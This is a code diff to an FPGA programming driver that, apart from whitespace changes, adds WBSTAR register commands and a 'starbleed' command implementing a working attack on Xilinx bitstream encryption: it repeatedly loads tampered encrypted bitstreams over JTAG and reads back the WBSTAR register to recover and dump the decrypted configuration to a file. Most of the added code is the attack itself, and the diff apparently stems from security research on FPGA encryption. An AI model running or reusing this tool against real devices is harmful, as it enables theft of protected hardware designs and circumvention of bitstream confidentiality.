@@ -24,12 +24,19 @@
 #include "xilinx_bit.h"
 #include "pld.h"
 
+uint32_t bswap32(const uint32_t input)
+{
+	uint8_t *buf = (uint8_t *)&input;
+	return (uint32_t)((uint32_t)buf[3] | (uint32_t)buf[2] << 8 | (uint32_t)buf[1] << 16 | (uint32_t)buf[0] << 24);
+}
+
 static int virtex2_set_instr(struct jtag_tap *tap, uint32_t new_instr)
 {
 	if (tap == NULL)
 		return ERROR_FAIL;
 
-	if (buf_get_u32(tap->cur_instr, 0, tap->ir_length) != new_instr) {
+	if (buf_get_u32(tap->cur_instr, 0, tap->ir_length) != new_instr)
+	{
 		struct scan_field field;
 
 		field.num_bits = tap->ir_length;
@@ -47,7 +54,7 @@ static int virtex2_set_instr(struct jtag_tap *tap, uint32_t new_instr)
 }
 
 static int virtex2_send_32(struct pld_device *pld_device,
-	int num_words, uint32_t *words)
+						   int num_words, uint32_t *words)
 {
 	struct virtex2_pld_device *virtex2_info = pld_device->driver_priv;
 	struct scan_field scan_field;
@@ -63,7 +70,7 @@ static int virtex2_send_32(struct pld_device *pld_device,
 	for (i = 0; i < num_words; i++)
 		buf_set_u32(values + 4 * i, 0, 32, flip_u32(*words++, 32));
 
-	virtex2_set_instr(virtex2_info->tap, 0x5);	/* CFG_IN */
+	virtex2_set_instr(virtex2_info->tap, 0x5); /* CFG_IN */
 
 	jtag_add_dr_scan(virtex2_info->tap, 1, &scan_field, TAP_DRPAUSE);
 
@@ -79,7 +86,7 @@ static inline void virtexflip32(jtag_callback_data_t arg)
 }
 
 static int virtex2_receive_32(struct pld_device *pld_device,
-	int num_words, uint32_t *words)
+							  int num_words, uint32_t *words)
 {
 	struct virtex2_pld_device *virtex2_info = pld_device->driver_priv;
 	struct scan_field scan_field;
@@ -88,9 +95,10 @@ static int virtex2_receive_32(struct pld_device *pld_device,
 	scan_field.out_value = NULL;
 	scan_field.in_value = NULL;
 
-	virtex2_set_instr(virtex2_info->tap, 0x4);	/* CFG_OUT */
+	virtex2_set_instr(virtex2_info->tap, 0x4); /* CFG_OUT */
 
-	while (num_words--) {
+	while (num_words--)
+	{
 		scan_field.in_value = (uint8_t *)words;
 
 		jtag_add_dr_scan(virtex2_info->tap, 1, &scan_field, TAP_DRPAUSE);
@@ -109,11 +117,11 @@ static int virtex2_read_stat(struct pld_device *pld_device, uint32_t *status)
 
 	jtag_add_tlr();
 
-	data[0] = 0xaa995566;	/* synch word */
-	data[1] = 0x2800E001;	/* Type 1, read, address 7, 1 word */
-	data[2] = 0x20000000;	/* NOOP (Type 1, read, address 0, 0 words */
-	data[3] = 0x20000000;	/* NOOP */
-	data[4] = 0x20000000;	/* NOOP */
+	data[0] = 0xaa995566; /* synch word */
+	data[1] = 0x2800E001; /* Type 1, read, address 7, 1 word */
+	data[2] = 0x20000000; /* NOOP (Type 1, read, address 0, 0 words */
+	data[3] = 0x20000000; /* NOOP */
+	data[4] = 0x20000000; /* NOOP */
 	virtex2_send_32(pld_device, 5, data);
 
 	virtex2_receive_32(pld_device, 1, status);
@@ -121,6 +129,71 @@ static int virtex2_read_stat(struct pld_device *pld_device, uint32_t *status)
 	jtag_execute_queue();
 
 	LOG_DEBUG("status: 0x%8.8" PRIx32 "", *status);
+
+	return ERROR_OK;
+}
+
+static int virtex2_read_wbstar(struct pld_device *pld_device, uint32_t *status)
+{
+	uint32_t data[5];
+
+	jtag_add_tlr();
+
+	data[0] = 0xaa995566; /* synch word */
+	data[1] = 0x20000000; /* NOOP (Type 1, read, address 0, 0 words */
+	data[2] = 0x28020001; /* Type 1, read, address 16, 1 word */
+	data[3] = 0x20000000; /* NOOP */
+	data[4] = 0x20000000; /* NOOP */
+	virtex2_send_32(pld_device, 5, data);
+
+	virtex2_receive_32(pld_device, 1, status);
+
+	jtag_execute_queue();
+
+	return ERROR_OK;
+}
+
+static int virtex2_write_wbstar(struct pld_device *pld_device, uint32_t wbstar)
+{
+	struct virtex2_pld_device *virtex2_info = pld_device->driver_priv;
+	unsigned int i;
+	struct scan_field field;
+	uint8_t *bitstream = (uint8_t *)malloc(384);
+	// uint32_t *bitstream_in_word = (uint32_t *)bitstream;
+	memcpy(bitstream, write_wbstar_bitstream, 384);
+	field.in_value = NULL;
+
+	virtex2_set_instr(virtex2_info->tap, 0xb); /* JPROG_B */
+	jtag_execute_queue();
+	jtag_add_sleep(1000);
+
+	virtex2_set_instr(virtex2_info->tap, 0x5); /* CFG_IN */
+	jtag_execute_queue();
+
+	((uint32_t *)bitstream)[22] = wbstar;
+
+	for (i = 0; i < 384; i++)
+		bitstream[i] = flip_u32(bitstream[i], 8);
+
+	field.num_bits = 384 * 8;
+	field.out_value = bitstream;
+	jtag_add_dr_scan(virtex2_info->tap, 1, &field, TAP_DRPAUSE);
+	jtag_execute_queue();
+
+	jtag_add_tlr();
+
+	if (!(virtex2_info->no_jstart))
+		virtex2_set_instr(virtex2_info->tap, 0xc); /* JSTART */
+	jtag_add_runtest(13, TAP_IDLE);
+	virtex2_set_instr(virtex2_info->tap, 0x3f); /* BYPASS */
+	virtex2_set_instr(virtex2_info->tap, 0x3f); /* BYPASS */
+	if (!(virtex2_info->no_jstart))
+		virtex2_set_instr(virtex2_info->tap, 0xc); /* JSTART */
+	jtag_add_runtest(13, TAP_IDLE);
+	virtex2_set_instr(virtex2_info->tap, 0x3f); /* BYPASS */
+	jtag_execute_queue();
+
+	free(bitstream);
 
 	return ERROR_OK;
 }
@@ -139,11 +212,11 @@ static int virtex2_load(struct pld_device *pld_device, const char *filename)
 	if (retval != ERROR_OK)
 		return retval;
 
-	virtex2_set_instr(virtex2_info->tap, 0xb);	/* JPROG_B */
+	virtex2_set_instr(virtex2_info->tap, 0xb); /* JPROG_B */
 	jtag_execute_queue();
 	jtag_add_sleep(1000);
 
-	virtex2_set_instr(virtex2_info->tap, 0x5);	/* CFG_IN */
+	virtex2_set_instr(virtex2_info->tap, 0x5); /* CFG_IN */
 	jtag_execute_queue();
 
 	for (i = 0; i < bit_file.length; i++)
@@ -158,14 +231,54 @@ static int virtex2_load(struct pld_device *pld_device, const char *filename)
 	jtag_add_tlr();
 
 	if (!(virtex2_info->no_jstart))
-		virtex2_set_instr(virtex2_info->tap, 0xc);	/* JSTART */
+		virtex2_set_instr(virtex2_info->tap, 0xc); /* JSTART */
 	jtag_add_runtest(13, TAP_IDLE);
-	virtex2_set_instr(virtex2_info->tap, 0x3f);		/* BYPASS */
-	virtex2_set_instr(virtex2_info->tap, 0x3f);		/* BYPASS */
+	virtex2_set_instr(virtex2_info->tap, 0x3f); /* BYPASS */
+	virtex2_set_instr(virtex2_info->tap, 0x3f); /* BYPASS */
 	if (!(virtex2_info->no_jstart))
-		virtex2_set_instr(virtex2_info->tap, 0xc);	/* JSTART */
+		virtex2_set_instr(virtex2_info->tap, 0xc); /* JSTART */
 	jtag_add_runtest(13, TAP_IDLE);
-	virtex2_set_instr(virtex2_info->tap, 0x3f);		/* BYPASS */
+	virtex2_set_instr(virtex2_info->tap, 0x3f); /* BYPASS */
+	jtag_execute_queue();
+
+	return ERROR_OK;
+}
+
+static int virtex2_load_malicious(struct pld_device *pld_device, uint8_t *malicious_bitstream, uint32_t bit_len)
+{
+	struct virtex2_pld_device *virtex2_info = pld_device->driver_priv;
+	unsigned int i;
+	struct scan_field field;
+
+	field.in_value = NULL;
+
+	virtex2_set_instr(virtex2_info->tap, 0xb); /* JPROG_B */
+	jtag_execute_queue();
+	jtag_add_sleep(1000);
+
+	virtex2_set_instr(virtex2_info->tap, 0x5); /* CFG_IN */
+	jtag_execute_queue();
+
+	for (i = 0; i < bit_len; i++)
+		malicious_bitstream[i] = flip_u32(malicious_bitstream[i], 8);
+
+	field.num_bits = bit_len * 8;
+	field.out_value = malicious_bitstream;
+
+	jtag_add_dr_scan(virtex2_info->tap, 1, &field, TAP_DRPAUSE);
+	jtag_execute_queue();
+
+	jtag_add_tlr();
+
+	// if (!(virtex2_info->no_jstart))
+	virtex2_set_instr(virtex2_info->tap, 0xc); /* JSTART */
+	jtag_add_runtest(13, TAP_IDLE);
+	virtex2_set_instr(virtex2_info->tap, 0x3f); /* BYPASS */
+	virtex2_set_instr(virtex2_info->tap, 0x3f); /* BYPASS */
+												// if (!(virtex2_info->no_jstart))
+	virtex2_set_instr(virtex2_info->tap, 0xc);	/* JSTART */
+	jtag_add_runtest(13, TAP_IDLE);
+	virtex2_set_instr(virtex2_info->tap, 0x3f); /* BYPASS */
 	jtag_execute_queue();
 
 	return ERROR_OK;
@@ -182,7 +295,8 @@ COMMAND_HANDLER(virtex2_handle_read_stat_command)
 	unsigned dev_id;
 	COMMAND_PARSE_NUMBER(uint, CMD_ARGV[0], dev_id);
 	device = get_pld_device_by_num(dev_id);
-	if (!device) {
+	if (!device)
+	{
 		command_print(CMD, "pld device '#%s' is out of bounds", CMD_ARGV[0]);
 		return ERROR_OK;
 	}
@@ -191,6 +305,188 @@ COMMAND_HANDLER(virtex2_handle_read_stat_command)
 
 	command_print(CMD, "virtex2 status register: 0x%8.8" PRIx32 "", status);
 
+	return ERROR_OK;
+}
+
+COMMAND_HANDLER(virtex2_handle_read_wbstar_command)
+{
+	struct pld_device *device;
+	uint32_t status;
+
+	if (CMD_ARGC < 1)
+		return ERROR_COMMAND_SYNTAX_ERROR;
+
+	unsigned dev_id;
+	COMMAND_PARSE_NUMBER(uint, CMD_ARGV[0], dev_id);
+	device = get_pld_device_by_num(dev_id);
+	if (!device)
+	{
+		command_print(CMD, "pld device '#%s' is out of bounds", CMD_ARGV[0]);
+		return ERROR_OK;
+	}
+
+	// virtex2_load_malicious(device, write_wbstar_bitstream, sizeof(write_wbstar_bitstream));
+
+	virtex2_read_wbstar(device, &status);
+	LOG_INFO("wbstar: 0x%8.8" PRIx32 "", status);
+
+	command_print(CMD, "virtex2 wbstar register: 0x%8.8" PRIx32 "", status);
+
+	return ERROR_OK;
+}
+
+COMMAND_HANDLER(virtex2_handle_write_wbstar_command)
+{
+	struct pld_device *device;
+	uint32_t wbstar;
+	if (CMD_ARGC < 1)
+		return ERROR_COMMAND_SYNTAX_ERROR;
+
+	unsigned dev_id;
+	COMMAND_PARSE_NUMBER(uint, CMD_ARGV[0], dev_id);
+	COMMAND_PARSE_NUMBER(u32, CMD_ARGV[1], wbstar);
+	device = get_pld_device_by_num(dev_id);
+	if (!device)
+	{
+		command_print(CMD, "pld device '#%s' is out of bounds", CMD_ARGV[0]);
+		return ERROR_OK;
+	}
+
+	wbstar = bswap32(wbstar);
+	virtex2_write_wbstar(device, wbstar);
+
+	// command_print(CMD, "virtex2 wbstar register: 0x%8.8" PRIx32 "", status);
+
+	return ERROR_OK;
+}
+
+COMMAND_HANDLER(virtex2_handle_starbleed_command)
+{
+	struct pld_device *device;
+	// uint32_t status;
+
+	struct xilinx_bit_file bit_file, bit_file_mod;
+	int retval;
+
+	retval = xilinx_read_bit_file(&bit_file, CMD_ARGV[1]);
+	if (retval != ERROR_OK)
+		return retval;
+
+	retval = xilinx_read_bit_file(&bit_file_mod, CMD_ARGV[2]);
+	if (retval != ERROR_OK)
+		return retval;
+
+	FILE *out_file = fopen(CMD_ARGV[3], "wb");
+
+	uint8_t *malicious_bitstream = malloc(bit_file_mod.length);
+
+	if (CMD_ARGC < 2)
+		return ERROR_COMMAND_SYNTAX_ERROR;
+
+	unsigned dev_id;
+	COMMAND_PARSE_NUMBER(uint, CMD_ARGV[0], dev_id);
+
+	device = get_pld_device_by_num(dev_id);
+	if (!device)
+	{
+		command_print(CMD, "pld device '#%s' is out of bounds", CMD_ARGV[0]);
+		return ERROR_OK;
+	}
+
+	// uint8_t wbstar_write_len;
+	// uint32_t cipher_line_num;
+	// uint32_t rolling_offset_word;
+	// COMMAND_PARSE_NUMBER(u8, CMD_ARGV[2], wbstar_write_len);
+	// COMMAND_PARSE_NUMBER(u32, CMD_ARGV[3], cipher_line_num);
+	// COMMAND_PARSE_NUMBER(u32, CMD_ARGV[4], rolling_offset_word);
+
+	// uint32_t last_plain[4] = {0, 0, 0, 0};
+	// virtex2_generate_malicious(&bit_file, malicious_bitstream, wbstar_write_len, cipher_line_num, last_plain, rolling_offset_word * 4);
+	// for(int i=0; i<MALICIOUS_BITSTREAM_LEN; i++){
+	// 	printf("%02x", malicious_bitstream[i]);
+	// 	if((i+1)%16==0){
+	// 		printf("\n");
+	// 	}
+	// }
+
+	// uint32_t lowbitoffset;
+	// for (lowbitoffset = bit_file.cipher_start + 3; lowbitoffset < 1024; lowbitoffset += 4)
+	// {
+	// 	memcpy(malicious_bitstream, bit_file.data, bit_file.length);
+	// 	malicious_bitstream[lowbitoffset] ^= 0xff;
+	// 	virtex2_load_malicious(device, malicious_bitstream, bit_file.length);
+	// 	jtag_add_sleep(1000);
+	// 	virtex2_read_wbstar(device, &status);
+	// 	command_print(CMD, "virtex2 wbstar register: 0x%8.8" PRIx32 "", status);
+	// 	// sleep(1000);
+	// }
+
+	uint32_t wbstar_reg, bswap32wbstar;
+	uint8_t xored_val;
+	uint32_t rolling_offset, line_num, *fabric_word, total_line_number;
+
+	LOG_INFO("Cipher Position: %d", bit_file_mod.cipher_start);
+	rolling_offset = bit_file_mod.cipher_start + 14 * 4 + 3;
+
+	// for (; position < bit_file.length; position += 1)
+	total_line_number = bit_file.dwc_length * 4 / 16;
+	for (line_num = 1; line_num < total_line_number; line_num++)
+	{
+		uint32_t wbstars[4] = {0, 0, 0, 0};
+		// LOG_INFO("wbstar: %8.8x%8.8x%8.8x%8.8x", wbstars[0], wbstars[1], wbstars[2], wbstars[3]);
+		for (xored_val = 0xd; xored_val >= 0xa; xored_val--)
+		{
+			memcpy(malicious_bitstream, bit_file_mod.data, bit_file_mod.length);
+
+			// make random
+			for (uint32_t i = 0; i < 16; i++)
+			{
+				malicious_bitstream[bit_file_mod.cipher_start + 16 * 5 + i] = 0xff;
+			}
+
+			// place fabric
+			for (uint32_t i = 0; i < 32; i++)
+			{
+				malicious_bitstream[bit_file_mod.cipher_start + 16 * 6 + i] = bit_file.data[bit_file.cipher_start + (line_num - 1) * 16 + i];
+			}
+			fabric_word = (uint32_t *)(malicious_bitstream + bit_file.cipher_start + 16 * 6);
+
+			//additional delta
+			for (uint32_t i = xored_val + 1; i <= 0xd; i++)
+			{
+				fabric_word[i - 0xa] ^= bswap32(wbstars[i - 0xa] ^ 0x20000000);
+			}
+
+			// LOG_INFO("Trying rolling_offset: bin[%02x]=%02x, xored with: %02x, line number: %d", rolling_offset, malicious_bitstream[rolling_offset], xored_val, line_num);
+			malicious_bitstream[rolling_offset] ^= (xored_val ^ 0x1);
+
+			device = get_pld_device_by_num(dev_id);
+			if (!device)
+			{
+				command_print(CMD, "pld device '#%s' is out of bounds", CMD_ARGV[0]);
+				return ERROR_OK;
+			}
+
+			virtex2_load_malicious(device, malicious_bitstream, bit_file_mod.length);
+
+			virtex2_read_wbstar(device, &wbstar_reg);
+			wbstars[xored_val - 0xa] = wbstar_reg;
+			if (0)
+			{
+				LOG_INFO("Xored: %02x, rolling_offset: %d", xored_val, rolling_offset);
+				LOG_INFO("wbstar: 0x%8.8" PRIx32 "", wbstar_reg);
+			}
+		}
+		LOG_INFO("progress: %d/%d (%.2f%%), wbstar: %8.8x%8.8x%8.8x%8.8x", line_num, total_line_number, (float)line_num * 100 / (float)total_line_number, wbstars[0], wbstars[1], wbstars[2], wbstars[3]);
+
+		for (int i = 0; i < 4; i++)
+		{
+			bswap32wbstar = bswap32(wbstars[i]);
+			fwrite(&bswap32wbstar, sizeof(uint32_t), 1, out_file);
+		}
+	}
+	fclose(out_file);
+	free(malicious_bitstream);
 	return ERROR_OK;
 }
 
@@ -204,7 +500,8 @@ PLD_DEVICE_COMMAND_HANDLER(virtex2_pld_device_command)
 		return ERROR_COMMAND_SYNTAX_ERROR;
 
 	tap = jtag_tap_by_string(CMD_ARGV[1]);
-	if (tap == NULL) {
+	if (tap == NULL)
+	{
 		command_print(CMD, "Tap: %s does not exist", CMD_ARGV[1]);
 		return ERROR_OK;
 	}
@@ -229,8 +526,28 @@ static const struct command_registration virtex2_exec_command_handlers[] = {
 		.help = "read status register",
 		.usage = "pld_num",
 	},
-	COMMAND_REGISTRATION_DONE
-};
+	{
+		.name = "read_wbstar",
+		.mode = COMMAND_EXEC,
+		.handler = virtex2_handle_read_wbstar_command,
+		.help = "read wbstar register",
+		.usage = "pld_num",
+	},
+	{
+		.name = "write_wbstar",
+		.mode = COMMAND_EXEC,
+		.handler = virtex2_handle_write_wbstar_command,
+		.help = "write wbstar register",
+		.usage = "pld_num",
+	},
+	{
+		.name = "starbleed",
+		.mode = COMMAND_EXEC,
+		.handler = virtex2_handle_starbleed_command,
+		.help = "dump bitstream via starbleed",
+		.usage = "pld_num",
+	},
+	COMMAND_REGISTRATION_DONE};
 static const struct command_registration virtex2_command_handler[] = {
 	{
 		.name = "virtex2",
@@ -239,8 +556,7 @@ static const struct command_registration virtex2_command_handler[] = {
 		.usage = "",
 		.chain = virtex2_exec_command_handlers,
 	},
-	COMMAND_REGISTRATION_DONE
-};
+	COMMAND_REGISTRATION_DONE};
 
 struct pld_driver virtex2_pld = {
 	.name = "virtex2",
